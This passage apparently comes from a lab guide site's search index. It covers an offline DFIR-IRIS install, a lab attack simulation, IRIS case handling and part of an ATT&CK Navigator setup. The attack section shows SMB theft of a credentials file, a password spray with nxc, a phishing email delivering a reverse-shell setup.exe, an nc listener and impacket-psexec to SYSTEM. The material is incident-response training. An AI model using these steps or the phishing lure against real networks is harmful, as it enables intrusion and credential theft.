https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce_28.0.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce-cli_28.0.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-buildx-plugin_0.21.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-compose-plugin_2.33.0-1~ubuntu.22.04~jammy_amd64.deb\n</code></pre> <p>Install the\u00a0<code>.deb</code>\u00a0packages. Change directory into the docker folder and run:</p> <pre><code>sudo dpkg -i *\n</code></pre> <p>Run <code>sudo service docker start</code></p> <pre><code>sudo service docker start\n</code></pre> <p>Run the following command to add your user to the <code>docker</code> group:</p> <pre><code>sudo usermod -aG docker $USER\n</code></pre> <p>Reload the group membership for your current session with the following command:</p> <pre><code>newgrp docker\n</code></pre> <p>Check if you can run Docker commands without <code>sudo</code>:</p> <pre><code>docker ps\n</code></pre> <p>Clone the IRIS GitHub repository as a zip archive from the IRIS GitHub page. </p> <pre><code>cd ~/iris-offline\nsudo apt update\nsudo apt install git\ngit clone https://github.com/dfir-iris/iris-web.git\ncd iris-web\n</code></pre> <p>Check out the latest\u00a0non-beta\u00a0tagged version:</p> <pre><code>git checkout v2.4.18\n</code></pre> <p>Note: If you are working in an air-gapped environment where Git is not installed, skip this step and ensure that the contents of the <code>.env</code> file match those of the <code>.env.model</code> file.</p> <p>Copy the environment file</p> <pre><code>cp .env.model .env\n</code></pre> <p>Note: The default configuration is suitable for testing only. To configure IRIS for production, see the\u00a0configuration section. Pull all required Docker images on a system with internet access:</p> <pre><code>docker compose pull \n</code></pre> <p>Verify that Docker images have been pulled successfully:</p> <pre><code>docker images\n</code></pre> <pre><code>REPOSITORY                           TAG                   IMAGE ID       CREATED        SIZE\nghcr.io/dfir-iris/iriswebapp_app     latest                964d171dbb2b   4 days ago     1.27GB\nghcr.io/dfir-iris/iriswebapp_nginx   latest                eec0b38cb17d   4 days ago     211MB\nghcr.io/dfir-iris/iriswebapp_db      latest                9795f95185ef   4 days ago     266MB\nrabbitmq                             3-management-alpine   e9a8d679cd6f   2 months ago   178MB\n</code></pre> <p>After pulling the images, save them as <code>.tar</code> files in the <code>~/docker/images</code> folder.</p> <pre><code>cd ~/iris-offline/docker-images\ndocker save -o iris_db.tar ghcr.io/dfir-iris/iriswebapp_db:latest\ndocker save -o iris_app.tar ghcr.io/dfir-iris/iriswebapp_app:latest\ndocker save -o iris_nginx.tar ghcr.io/dfir-iris/iriswebapp_nginx:latest\ndocker save -o rabbitmq.tar rabbitmq:3-management-alpine\n</code></pre> <p>Compress <code>iris-offline</code> for transfer</p> <pre><code>cd ~/iris-offline\ntar -czvf iris-offline.tar.gz *\n</code></pre> <p>Transfer <code>caldera-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p> <p>Installing IRIS in the Air-Gapped Environment</p> <p>Extract the transferred archive.</p> <pre><code>cd ~\ntar -xzvf iris-offline.tar.gz\n</code></pre> <p>Load transferred docker images.</p> <pre><code>cd ~/iris-offline/docker-images\ndocker load -i iris_db.tar\ndocker load -i iris_app.tar\ndocker load -i iris_nginx.tar\ndocker load -i rabbitmq.tar\n</code></pre> <p>Once the images are loaded, run IRIS:</p> <pre><code># Add \"-d\" to put it in the background\ndocker compose up\n</code></pre> <p>IRIS should now be accessible on your host interface via the HTTPS protocol, with port 443 used by default. You can open it in your web browser at <code>https://hostip</code>. If prompted with a warning about a self-signed certificate, click Advanced, then select Accept the Risk and Continue.</p> <p></p> <p></p> <p>When starting for the first time, an administrator account is automatically created. The password is displayed in the console output and can be located in the logs by searching for <code>WARNING :: post_init :: create_safe_admin</code>. Alternatively, you can set an admin password during the initial startup by specifying it in the <code>.env</code> file using the <code>IRIS_ADM_PASSWORD</code> environment variable. Please note that this option has no effect after the administrator account has been created.</p> <p>Note: The username is \"administrator\" with a lowercase \"a\", not an uppercase \"A\".</p> <pre><code>sudo docker compose logs app | grep \"WARNING :: post_init :: create_safe_admin\"\n</code></pre> <pre><code>iriswebapp_app  | 2024-12-23 07:15:05 :: WARNING :: post_init :: create_safe_admin :: &gt;&gt;&gt; Administrator password: Gk@#PklyAYEy0x&amp;s\n</code></pre> <p>If the password is not visible in the logs, try running <code>docker compose logs app | grep \"WARNING :: post_init :: create_safe_admin\"</code>. If the logs show that the user <code>administrator</code> has already been created, it indicates the instance has been started before, and the password is already set. In this case, refer to the recovery options.</p>"},{"location":"iris/iris.html#attack-simulation","title":"Attack Simulation","text":"<p>The smbclient tool on a Kali machine was used to connect to an SMB share hosted on WS2019 at 10.0.0.140. After logging in anonymously, the share\u2019s contents were listed, a file (user_credentials.xlsx) was downloaded, and the session was exited.</p> <pre><code>\u2514\u2500$ smbclient //10.0.0.140/Shares\nPassword for [WORKGROUP\\kali]:\nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sat Dec 14 06:26:10 2024\n  ..                                  D        0  Sat Dec 14 06:26:10 2024\n  user_credentials.xlsx               A     9387  Sat Dec 14 06:21:40 2024\n\n                15570943 blocks of size 4096. 11749781 blocks available\nsmb: \\&gt; get user_credentials.xlsx \ngetting file \\user_credentials.xlsx of size 9387 as user_credentials.xlsx (327.4 KiloBytes/sec) (average 327.4 KiloBytes/sec)\nsmb: \\&gt; exit\n</code></pre> <p>The user_credentials.xlsx file revealed the credentials for a domain account named Splunk. Based on this information, a list of usernames and passwords was created. A credential spray was conducted using nxc smb with these usernames and passwords, which revealed that the Domain Administrator account was using the same password.</p> <p></p> <pre><code>\u2514\u2500$ nxc smb 10.0.0.0/24 -u usernames.txt -p passwords.txt --shares --continue-on-success\n&lt;SNIP&gt;\nSMB         10.0.0.140      445    WS2019           [+] cyber.local\\administrator:P@ssw0rd (Pwn3d!)\nSMB         10.0.0.140      445    WS2019           [+] cyber.local\\splunk:P@ssw0rd\n</code></pre> <p>IT Support was impersonated to send a phishing email to a user. The email included a link directing to a Kali machine hosting <code>setup.exe</code> on an HTTP server. The <code>setup.exe</code> file was a reverse shell payload designed to connect back to the Kali machine on port 443.</p> <p>After setting up a listener on port 443 and manually executing <code>setup.exe</code> (with Windows Defender disabled), a reverse shell was successfully obtained.</p> <p></p> <pre><code>\u2514\u2500$ nc -nvlp 443\nlistening on [any] 443 ...\nconnect to [10.0.0.29] from (UNKNOWN) [10.0.0.140] 61202\nMicrosoft Windows [Version 10.0.17763.3650]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\Administrator\\Downloads&gt;whoami\nwhoami\ncyber\\administrator\n\nC:\\Users\\Administrator\\Downloads&gt;\n</code></pre> <p>Using the previously obtained Domain Administrator credentials from password spraying, impacket-psexec was utilised to gain access to WS2019 with NT AUTHORITY\\SYSTEM privileges.</p> <pre><code>\u2514\u2500$ impacket-psexec administrator:P@ssw0rd@10.0.0.140 \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.0.0.140.....\n[*] Found writable share ADMIN$\n[*] Uploading file DaZyEoxe.exe\n[*] Opening SVCManager on 10.0.0.140.....\n[*] Creating service epJh on 10.0.0.140.....\n[*] Starting service epJh.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.3650]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre>"},{"location":"iris/iris.html#introduction-to-iris","title":"Introduction to IRIS","text":""},{"location":"iris/iris.html#adding-a-customer","title":"Adding a Customer","text":"<p>Upon entering the administrator credentials, the Dashboard highlights pending tasks and ongoing cases.</p> <p></p> <p>To access the customer management page, open the sidebar menu, expand the Advanced section, and click on Customers.</p> <p></p> <p>This displays a list of customers. To add a new customer, click Add Customer in the top-right corner of the window. In this window, we can input the customer's details. We'll name the customer cyber.local and add customer as a brief description. There's also an option to specify the Service-Level Agreement (SLA) with the customer, but since we don't have one in this instance, we'll leave it blank.</p> <p></p> <p>Click Save to create the customer. Once saved, the new customer will appear in the list on the Customer Management page.</p> <p></p>"},{"location":"iris/iris.html#creating-a-case","title":"Creating a Case","text":"<p>Having logged into IRIS and created our customer, we can now begin the case management process. A case is the fundamental unit of an incident. It serves as a container for various elements used to organise information related to the incident.</p> <p>To create a new case, navigate to the dashboard and click Create new case in the top-right corner of the window. This opens a new page with several fields for entering details about the new case. </p> <p>For Customer, select cyber.local. For Case Name, enter [2024-12-16] Data Breach. The Select Case Template option allows us to choose a predefined template for the case. Templates can automatically populate various elements, such as tasks, tags, a case title prefix, and more. Since this step is optional, we\u2019ll leave it blank.</p> <p>For Classification, select Information-Content-Security: Unauthorised Access to Information. For Short Description, enter Data breach from unauthorised SMB share access. </p> <p>The last field is the SOC Ticket ID. In many cases, incidents are monitored through a ticketing platform like Jira or ServiceNow. While we're not using a ticketing system for this example, this is where you would input the ticket ID if one were being used.</p> <p></p> <p>After completing all the required fields, click Create to add the case. A pop-up will appear confirming that the case has been successfully created.</p> <p></p> <p>With our new case created, we can return to the dashboard by clicking Go to Dashboard in the pop-up or selecting Dashboard from the sidebar menu.</p> <p>Our newly created case, titled #2 - [2024-12-16] Data Breach, appears under Attributed Open Cases. The prefix #2 is automatically added to the case title, reflecting its sequence in the total number of cases created in the system.</p> <p></p> <p>By clicking on the case name, we are taken to the Summary tab for the case. This page offers a range of options for managing the case.</p> <p></p>"},{"location":"iris/iris.html#adding-assets","title":"Adding Assets","text":"<p>During incident response, maintaining a list of assets that are known or suspected to be compromised is essential. To add an asset, go to the Assets tab on the case page. This will display the asset list, which is currently empty. To include a new asset, click the Add Assets button located in the top-right corner of the window.</p> <p></p> <p>For the first asset, enter the following details:</p> <ul> <li>Asset Type: Select Windows - DC.</li> <li>Asset Name: Enter WS2019.</li> <li>Description: Add Windows Server 2019 Domain Controller.</li> <li>Domain: Specify cyber.local.</li> <li>IP: 10.0.0.140</li> <li>Compromise Status: Choose Compromised.</li> <li>Analysis Status: Set to Done, as the machine has been confirmed compromised and analysis is complete.</li> <li>Tags: Add Windows and Domain Controller.</li> </ul> <p>Click Save in the lower right-hand corner of the window. </p> <p></p> <p>This creates the following entry in the list of assets:</p> <p></p> <p>For the second asset, enter the following details:</p> <ul> <li>Asset Type: Select Linux - Computer.</li> <li>Asset Name: Enter Splunk.</li> <li>Description: Add A Linux computer running Splunk Enterprise.</li> <li>Domain: (Leave it blank)</li> <li>IP: 10.0.0.120</li> <li>Compromise Status: Choose Compromised.</li> <li>Analysis Status: Set to Done, as the machine has been confirmed compromised and analysis is complete.</li> <li>Tags: Add Linux and Splunk.</li> </ul> <p>Click Save in the lower right-hand corner of the window. </p> <p></p> <p>The new asset will now appear in the Assets tab list:</p> <p></p> <p>Next, set asset details for the Domain account splunk:</p> <ul> <li>Asset Type: Select Windows Account - AD.</li> <li>Asset Name: Enter splunk (the username).</li> <li>Description: Add Domain account.</li> <li>Domain: Set to cyber.local.</li> <li>Compromise Status: Choose Compromised.</li> <li>Analysis Status: Select Done.</li> <li>Tags: Add Windows, Active Directory, and Account.</li> </ul> <p></p> <p>Click Save to finalise the entry. The new asset will now appear in the Assets tab list.</p> <p></p> <p>Next, set asset details for the Domain Administrator account:</p> <ul> <li>Asset Type: Select Windows Account - AD - Admin.</li> <li>Asset Name: Enter Administrator (the username).</li> <li>Description: Add Domain Administrator account.</li> <li>Domain: Set to cyber.local.</li> <li>Compromise Status: Choose Compromised.</li> <li>Analysis Status: Select Done.</li> <li>Tags: Add Windows, Active Directory, and Administrator Account.</li> </ul> <p></p> <p>Click Save. Our list of assets in the case's Assets tab now contains a total of four entries.</p> <p></p>"},{"location":"iris/iris.html#creating-a-timeline","title":"Creating a Timeline","text":"<p>In IRIS, we can create a timeline by adding individual events to document the sequence of actions and incidents.</p> <p>The first event is File Creation Event Detected for setup.exe on WS2019. To locate the log for this event, search the Splunk server using the following query:</p> <pre><code>index=* \"setup.exe\"\n</code></pre> <p>Set the timeframe to All time to ensure the event is captured.</p> <p></p> <p>To create an event for this in the timeline, navigate to the Timeline tab. Click Add event and enter the following details:</p> <ul> <li>Title: File Creation Event Detected for setup.exe on WS2019</li> <li>Time: 14/12/2024 12:16:54.000 AM with the UTC offset of +13:00.<ul> <li>The most widely used standard for recording time data is Coordinated Universal Time (UTC). In this case, we've included +13:00 as the UTC offset. This is because the Splunk server is configured to New Zealand time, which generally has a UTC offset of +13 hours during Daylight Saving Time.</li> </ul> </li> <li>Description: The Firefox process created a file named setup.exe in the Administrator's Downloads folder on WS2019.</li> <li> <p>Event Raw data: C:\\Program Files\\Mozilla Firefox\\firefox.exeC:\\Users\\Administrator\\Downloads\\setup.exe <ul> <li>To obtain raw event data, clicking the &gt; icon reveals the Event Actions dropdown. From the dropdown options, select Show Source to display the raw log.</li> <li>Selecting Show Source opens a new browser tab, highlighting the raw log entry. From there, we can copy the log and paste it into the raw event data field.</li> </ul> <p></p> <li> <p>Event Source: Sysmon</p> </li> <li>Event Tags: file creation, Firefox, setup.exe</li> <li>Link to Assets: WS2019</li> <li>Event Category: Initial Access</li> <li>Select Add to Summary to include the event in the timeline visualisation.</li> <li>Choose Display in Graph to add the event to the graph view.</li> <li>Use the red box to assign a colour to the event for easy identification.</li> <li>Save</li> <p></p> <p>Upon saving, we are taken to the Timeline tab, where the event we just created is now visible.</p> <p></p> <p>The next event to document is Anonymous Login accessing C:\\Shares on WS2019. To locate the log for this event, search the Splunk server using the following query:</p> <pre><code>index=* source=\"WinEventLog:Security\" \"EventCode=5140\" Account_Name=\"ANONYMOUS LOGON\"\n</code></pre> <p>Set the timeframe to All time to ensure the event is captured.</p> <p></p> <p>The log reveals that the event occurred at 04:17:52.000 PM. Expanding the log by selecting Show all 31 lines provides additional details about the event, including the Share Path, which is listed as ??\\C:\\Shares. Click Add event and enter the following details:</p> <ul> <li>Title: Anonymous Login Accessed C:\\Shares on WS2019</li> <li>Time: 16/12/2024 04:17:52.000 PM with the UTC offset of\u00a0+13:00.</li> <li>Description: An anonymous login accessed the share path ??\\C:\\Shares on WS2019 from the source IP address 10.0.0.29. Accessed user_credentials.xlsx.</li> <li>Event Raw data: 12/16/2024 04:17:52 PM LogName=Security EventCode=5140 EventType=0 ComputerName=WS2019.cyber.local  <li>Event Source: Windows Event Log</li> <li>Event tags: anonymous login, smb</li> <li>Link to assets: WS2019</li> <li>Event category: Initial Access</li> <li>Select Add to Summary to include the event in the timeline visualisation.</li> <li>Choose Display in Graph to add the event to the graph view.</li> <li>Use the orange box to assign a colour to the event for easy identification.</li> <li>Save</li> <p></p> <p>After clicking Save, we are redirected to the Timeline tab, where our newly created event is now displayed.</p> <p></p> <p>The next event to document is Malicious Service Installed on WS2019. To locate the log for this event, search the Splunk server using the following query:</p> <pre><code>index=* EventCode=7045\n</code></pre> <p>Set the timeframe to All time to ensure the event is captured.</p> <p></p> <p>Click Add event and enter the following details:</p> <ul> <li>Title: Malicious Service Installed on WS2019</li> <li>Time: 16/12/2024 10:16:53.000 PM with the UTC offset of +13:00.</li> <li>Description: A malicious service (LQEu) was installed on WS2019. The service runs under the LocalSystem account.</li> <li>Event Raw data: 12/16/2024 10:16:53 PM LogName=System EventCode=7045 EventType=4 ComputerName=WS2019.cyber.local  <li>Event Source: Windows Event Log</li> <li>Event tags: malicious service</li> <li>Link to assets: WS2019</li> <li>Event category: Persistence</li> <li>Select Add to Summary to include the event in the timeline visualisation.</li> <li>Choose Display in Graph to add the event to the graph view.</li> <li>Use the green box to assign a colour to the event for easy identification.</li> <li>Save</li> <p></p> <p>After saving, the Timeline tab displays the newly added event, bringing the total to three events.</p> <p></p>"},{"location":"iris/iris.html#adding-evidence","title":"Adding Evidence","text":"<p>In incident response, evidence is crucial for verifying details such as the nature, origin, timing, and potential culprits behind an incident. In this instance, we\u2019ll include the <code>.eml</code> file, which contains the original phishing email that delivered the <code>setup.exe</code> file laced with malware. The following is the content of our raw email:</p> <pre><code>Delivered-To: &lt;SNIP&gt;@gmail.com\n\nDear staff,\n\nI hope this email finds you well.\n\nPlease download the required setup.exe file using this link\n&lt;http://10.0.0.29/setup.exe&gt; as the file size is too large to attach to\nthis email.\n\nOnce downloaded, follow these steps to install:\n\n1. Save the file to your computer.\n2. Double-click the downloaded file to start the installation.\n3. Follow the on-screen prompts to complete the setup.\n\nPlease note that some security warnings might appear when running the file.\nThese can be safely ignored, as many executable files are flagged as\nsuspicious by default.\n\nIf you experience any issues or have questions, feel free to reach out to\nme directly.\n\nThank you for your cooperation.\n\nBest regards,\n\nIT helpdesk\n\n--000000000000e1ecfe0629387b6c\nContent-Type: text/html; charset=\"UTF-8\"\nContent-Transfer-Encoding: quoted-printable\n\n&lt;div dir=3D\"ltr\"&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;&lt;div dir=3D\"auto\"&gt;&lt;div&gt;&lt;div&gt;&lt;p&gt;Dear staff,&lt;=\n/p&gt;&lt;p&gt;I hope this email finds you well.&lt;br&gt;&lt;br&gt;Please download the required=\n setup.exe file using this &lt;a href=3D\"http://10.0.0.29/setup.exe\"&gt;link&lt;/a&gt; =\nas the file size is too large to attach to this email.&lt;br&gt;&lt;br&gt;Once download=\ned, follow these steps to install:&lt;br&gt;&lt;br&gt;1. Save the file to your computer=\n.&lt;br&gt;2. Double-click the downloaded file to start the installation.&lt;br&gt;3. F=\nollow the on-screen prompts to complete the setup.&lt;br&gt;&lt;br&gt;Please\n note that some security warnings might appear when running the file.=20\nThese can be safely ignored, as many executable files are flagged as=20\nsuspicious by default.&lt;br&gt;&lt;br&gt;If you experience any issues or have question=\ns, feel free to reach out to me directly.&lt;br&gt;&lt;br&gt;Thank you for your coopera=\ntion.&lt;br&gt;&lt;br&gt;Best regards,&lt;br&gt;&lt;br&gt;IT helpdesk&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/=\ndiv&gt;&lt;/div&gt;&lt;/div&gt;\n\n--000000000000e1ecfe0629387b6c--\n</code></pre> <p>Let\u2019s start by uploading the <code>email.eml</code> file, which contains the original phishing email. To do this, we\u2019ll go to our case, click on the database icon located in the upper right corner of the window, and open the datastore.</p> <p>Within our case, there are three subdirectories: Evidences, IOCs, and Images. To add the file to the Evidences folder, we\u2019ll click the + icon next to the folder name and then select Add file.</p> <p></p> <p>We\u2019ll start by browsing for the file. Once selected, the Filename field will automatically populate with the file name. Next, we\u2019ll add a brief description: Email that delivered setup.exe to the user. We\u2019ll tag the file with phishing and malware, then select File is Evidence to ensure it\u2019s included in the Evidence tab.</p> <p></p> <p>Once we click Save, the file will appear in the Evidences folder within the datastore.</p> <p></p> <p>As we selected File is Evidence for each uploaded file, they were all registered as evidence under the case\u2019s Evidences tab. Each entry includes its corresponding SHA256 hash.</p> <p></p>"},{"location":"iris/iris.html#collaboration-and-access-management","title":"Collaboration and Access Management","text":"<p>During incident response, we generally operate as part of a team, maintaining regular communication with our team members.</p> <p>To add a comment, navigate to the Timeline tab and click on the speech bubble icon located in the upper right corner of the event. We can add multiple comments or questions here, simulating a chat.</p> <p></p> <p>In IRIS, we can also create and assign tasks. To do this, navigate to the Tasks tab and click Add task in the upper right corner of the window.</p> <p></p> <p>In the task creation window, we\u2019ll:</p> <ol> <li>Assign the task to administrator (the only user for now).</li> <li>Set the Status to To do.</li> <li>Add a Task Title: Upload install.ps1 file to evidence.</li> <li>Include a detailed Description: The install.ps1 file was used to create a reverse shell on WS2019 to establish persistence. Upload a copy to evidence.</li> <li>Tag the task with malware and reverse shell.</li> </ol> <p></p> <p>To create the task, we click the Save button. This adds it to the list of tasks displayed in the Tasks tab.</p> <p></p> <p>To manage user access, go to the Advanced dropdown in the sidebar and select Access Control. This allows you to control who can access specific cases or case types.</p> <p></p> <p>Here, we see Users and Groups as the main permission entities. The Users section displays a list of all individual users.</p> <p></p> <p>Currently, we only have one user, administrator. We\u2019ll select this user and navigate to the Cases access tab.</p> <p></p> <p>The Cases access tab shows that the administrator user has full access to one case, [2024-12-16] Data breach. To grant or restrict access to additional cases, we can click the Set case access button.</p>"},{"location":"iris/iris.html#generating-a-report","title":"Generating a Report","text":"<p>We can generate reports using a report template, which ensures completeness and consistency across cases while saving time. An IRIS report template is a file that includes various tags representing different types of content.</p> <p>To view the default IRIS investigations report template, we\u2019ll go to the Advanced dropdown in the sidebar menu and select Report Templates.</p> <p>We can download an example of an investigation template and an activities report template. Click Add template and upload investigation template.</p> <p></p> <p>Add the following details:</p> <ul> <li>Template name: Investigation</li> <li>Template type: Investigation</li> <li>Template language: English</li> <li>Template description: Investigation</li> <li>Template name format: %case_name%_%date%</li> <li>Template file: iris_report_template.docx (investigation template)</li> </ul> <p></p> <p>To open the investigation template, double-click on the .docx file. By default, it will open in LibreOffice, an open-source office suite, on our Ubuntu machine.</p> <p>Let\u2019s take a look at the cover page. The <code>{{ case.name }}</code> tag represents the case name, <code>{{ doc_id }}</code> corresponds to the IRIS document ID, and <code>{{ date }}</code> represents the current date. When the template is processed, these placeholders will be replaced with the relevant data at that point in time.</p> <p></p> <p>Now, let\u2019s examine the asset list on page 3. Here, we see a small table generated using a Jinja2 for loop. The loop begins with <code>{%tr for asset in assets %}</code> and ends with <code>{%tr endfor %}</code>. For each asset, a row is created that includes its name, type, compromise status, and description, each represented by corresponding tags. The template can be customised to add or remove elements as needed.</p> <p></p> <p>To generate an IRIS report, navigate to the Summary tab of the case and click the Generate report button.</p> <p></p> <p>This opens a window where we can choose a report template. We\u2019ll select Investigation. Click the Generate button to create and download the report. Alternatively, we can click the Generate in Safe Mode button on the left. This option generates the report without including images.</p> <p></p> <p>Now that the report is generated, let\u2019s inspect the changes. Open the file by double-clicking it in the downloads list. Start by reviewing the cover page again.</p> <p>This time, the placeholders have been replaced with actual data. The <code>{{ case.name }}</code> tag now shows the case name, \"#2 - [2024-12-16] Data breach\". Similarly, <code>{{ doc_id }}</code> is replaced with \"241217_0930\" and <code>{{ date }}</code> displays \"2024-12-17\".</p> <p></p> <p>A similar update occurred on page 3 with the asset list. The for loop populated the table with four rows, each representing the assets we created: WS2019, Splunk, splunk, and Administrator.</p> <p></p>"},{"location":"iris/iris.html#case-closure-and-database-backup","title":"Case Closure and Database Backup","text":"<p>Once incident response concludes and all tasks are completed, the case can be closed. To do this, navigate to the Summary tab and click the Manage button, identified by the gear icon.</p> <p></p> <p>Before closing the case, we need to update its Outcome. To do this, click the Edit button.</p> <p></p> <p>In the Outcome dropdown, we can choose from several options:</p> <ul> <li>Unknown: No clear outcome was determined.</li> <li>False Positive: The investigation confirmed no attack occurred.</li> <li>True Positive with impact: An attack occurred, affecting the organisation.</li> <li>True Positive without impact: An attack occurred but caused no impact.</li> <li>Not applicable: The investigation was not completed.</li> </ul> <p>We\u2019ll select True Positive with impact.</p> <p>At the bottom left of the window, there are two choices: Delete case and Close case. We\u2019ll choose Close case to finalise it.</p> <p></p> <p>A pop-up window will appear, asking for confirmation to close the case. We\u2019ll click OK to confirm. Once confirmed, the case will be closed, and the page colour will update to reflect its closed status.</p> <p></p> <p>To retain data, we usually create a copy for storage elsewhere. While IRIS doesn\u2019t allow copying individual cases, we can back up the entire IRIS database, which includes all cases, using the <code>pg_dump</code> command.  Since IRIS runs inside a Docker container, we\u2019ll need to use <code>docker exec</code> to run the command within the container.</p> <p>First, we need to identify the container ID where IRIS is running. We can do this by executing:</p> <pre><code>sudo docker container ls | grep iriswebapp_db\n</code></pre> <pre><code>cyber@Iris:~/iris-web$ sudo docker container ls | grep iriswebapp_db\n[sudo] password for cyber: \n08ad6d02ce90   ghcr.io/dfir-iris/iriswebapp_db:latest      \"docker-entrypoint.s\u2026\"   7 hours ago   Up 7 hours             5432/tcp                                                               iriswebapp_db\n</code></pre> <p>Next, we\u2019ll use the container ID with the <code>docker exec</code> command to back up the database. We\u2019ll run the following:</p> <pre><code>sudo docker exec 08ad6d02ce90 pg_dump -U postgres iris_db | gzip &gt; iris_db_backup.gz\n</code></pre> <pre><code>cyber@Iris:~/iris-web$ sudo docker exec 08ad6d02ce90 pg_dump -U postgres iris_db | gzip &gt; ../iris_db_backup.gz\n</code></pre> <p>Alternatively, we can create a backup directly from the IRIS web application. To do this:</p> <ol> <li>Navigate to Advanced &gt; Server settings &gt; Backups &gt; Database.</li> <li>Click on Backup database.</li> </ol> <p>Before doing this, we need to set the <code>BACKUP_PATH</code> environment variable to specify the destination directory where the backup will be stored.</p> <p></p>"},{"location":"iris/iris.html#references","title":"References","text":"<ul> <li>https://docs.dfir-iris.org/latest/</li> <li>https://github.com/dfir-iris/iris-web</li> <li>https://youtu.be/XXyIv_aes4w?si=L2Kn1BNXyEdVXwwI</li> </ul>"},{"location":"navigator/navigator.html","title":"MITRE ATT&amp;CK Navigator","text":"<p>The ATT&amp;CK Navigator is a simple, flexible tool for exploring and annotating ATT&amp;CK matrices, replacing manual methods like spreadsheets. It helps users map defensive coverage, plan red/blue team activities, track detected techniques, and more. With features like colour coding, comments, and numerical values, it makes ATT&amp;CK more accessible through intuitive visualisation.</p> <p>A key feature is customisable \"layers,\" allowing users to focus on specific platforms, highlight adversary techniques, or filter data. Layers can be created interactively or generated programmatically for later use.</p>"},{"location":"navigator/navigator.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, MITRE ATT&amp;CK Navigator was installed and configured in an air-gapped Ubuntu environment. Layers were created using the Tactics, Techniques, and Procedures (TTPs) of well-known Advanced Persistent Threats (APTs). These layers were rendered in different colours and combined to demonstrate how MITRE ATT&amp;CK Navigator can be used for both red team and blue team planning.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.10 (WAN) / 10.0.0.1 (LAN) Ubuntu Ubuntu 24.04 Internet-Connected VM 10.0.0.200 Mitre Ubuntu 24.04 Air-gapped VM 10.0.0.150 <p></p>"},{"location":"navigator/navigator.html#requirements","title":"Requirements","text":"<ul> <li>Node.js v18 \u2013 Ensure you have this version installed to support compatibility.</li> <li>Angular CLI v17 \u2013 Needed for managing Angular projects and dependencies.</li> </ul>"},{"location":"navigator/navigator.html#installing-mitre-attck-navigator-offline","title":"Installing MITRE ATT&amp;CK Navigator Offline","text":""},{"location":"navigator/navigator.html#on-an-internet-connected-machine","title":"On an Internet-Connected Machine","text":"<p>On an internet-connected Ubuntu VM, refresh the package lists from the repositories and create a structured directory for downloading dependencies:</p> <pre><code>sudo apt-get update\nmkdir -p ~/mitre-offline/{vmtools,git,libre,nodejs,angular-cli}\n</code></pre> <p>Download and install VM tools (this will enable copy and pasting and dynamic resolution). </p> <pre><code>cd ~/mitre-offline/vmtools\napt-get download \\\n  libatkmm-1.6-1v5 \\\n  libcairomm-1.0-1v5 \\\n  libglibmm-2.4-1t64 \\\n  libgtkmm-3.0-1t64 \\\n  libmspack0t64 \\\n  libpangomm-1.4-1v5 \\\n  libsigc++-2.0-0v5 \\\n  libxmlsec1t64 \\\n  libxmlsec1t64-openssl \\\n  open-vm-tools \\\n  open-vm-tools-desktop \\\n  zerofree\nsudo dpkg -i *.deb\n</code></pre> <p>After installing VM tools, you may need to reboot the VM if copy and pasting does not work. </p> <p>Download and install Git. Verify the installation.</p> <pre><code>cd ~/mitre-offline/git\nsudo apt-get download git git-man liberror-perl\nsudo dpkg -i *.deb\ngit --version\n</code></pre> <p>Download LibreOffice.</p> <pre><code>cd ~/mitre-offline/libre\nsudo apt-get -o Dir::Cache::archives=\"/home/cyber/mitre-offline/libre\" --download-only install libreoffice\n</code></pre> <p>Download and install Node.js v18. Verify the installation.</p> <pre><code>cd ~/mitre-offline/nodejs\nwget https://nodejs.org/dist/v18.20.6/node-v18.20.6-linux-x64.tar.xz\ntar -xvf node-v18.20.6-linux-x64.tar.xz \nsudo mv node-v18.20.6-linux-x64 /usr/local/nodejs\necho 'export PATH=/usr/local/nodejs/bin:$PATH' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nnode --version\nnpm --version\n</code></pre> <p>Use\u00a0<code>npm install</code>\u00a0to download all Angular CLI v17 dependencies into the\u00a0<code>node_modules</code>\u00a0directory. This process may take some time.</p> <pre><code>cd ~/mitre-offline/angular-cli \nnpm install @angular/cli@17\n</code></pre> <p>Clone MITRE ATT&amp;CK Navigator repository. This process may take some time.</p> <pre><code>cd ~/mitre-offline\ngit clone https://github.com/mitre-attack/attack-navigator.git\n</code></pre> <p>Use\u00a0<code>npm install</code>\u00a0to download all dependencies into the\u00a0<code>node_modules</code>\u00a0directory:</p> <pre><code>cd ~/mitre-offline/attack-navigator/nav-app\nnpm install\n</code></pre> <p>Download the latest MITRE ATT&amp;CK data files into the\u00a0<code>nav-app/src/assets</code>\u00a0directory.</p> <pre><code>cd ~/mitre-offline/attack-navigator/nav-app/src/assets\nwget https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json\nwget https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/mobile-attack/mobile-attack.json\nwget https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/ics-attack/ics-attack.json\n</code></pre> <p>Create <code>index.json</code> in the <code>nav-app/src/assets</code> with the following content.</p> <pre><code>nano ~/mitre-offline/attack-navigator/nav-app/src/assets/index.json\n</code></pre> <pre><code>{\n    \"id\": \"10296991-439b-4202-90a3-e38812613ad4\",\n    \"name\": \"MITRE ATT&amp;CK\",\n    \"description\": \"MITRE ATT&amp;CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. The ATT&amp;CK knowledge base is used as a foundation for the development of specific threat models and methodologies in the private sector, in government, and in the cybersecurity 